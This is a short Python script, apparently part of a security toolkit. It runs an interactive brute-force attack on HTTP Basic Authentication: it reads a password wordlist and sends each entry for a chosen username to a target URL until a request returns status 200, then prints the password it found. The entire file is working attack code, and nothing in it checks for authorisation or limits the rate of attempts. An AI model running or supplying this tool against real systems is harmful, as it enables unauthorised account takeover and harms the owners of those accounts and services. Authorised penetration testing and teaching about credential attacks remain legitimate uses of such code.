import requests
from requests.auth import HTTPBasicAuth

def run():
    """Run a simple HTTP Basic Auth brute-force attack interactively."""
    url = input("Enter target URL (with http/https): ")
    username = input("Enter username: ")
    wordlist_path = input("Enter path to password wordlist: ")
    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f]
    except Exception as e:
        print(f"Error reading wordlist: {e}")
        return
    print(f"\nStarting brute-force on {url} with username '{username}'...")
    for password in passwords:
        response = requests.get(url, auth=HTTPBasicAuth(username, password))
        if response.status_code == 200:
            print(f"Success! Password found: {password}")
            return
        else:
            print(f"Tried: {password}")
    print("Brute-force failed. No valid password found in wordlist.") 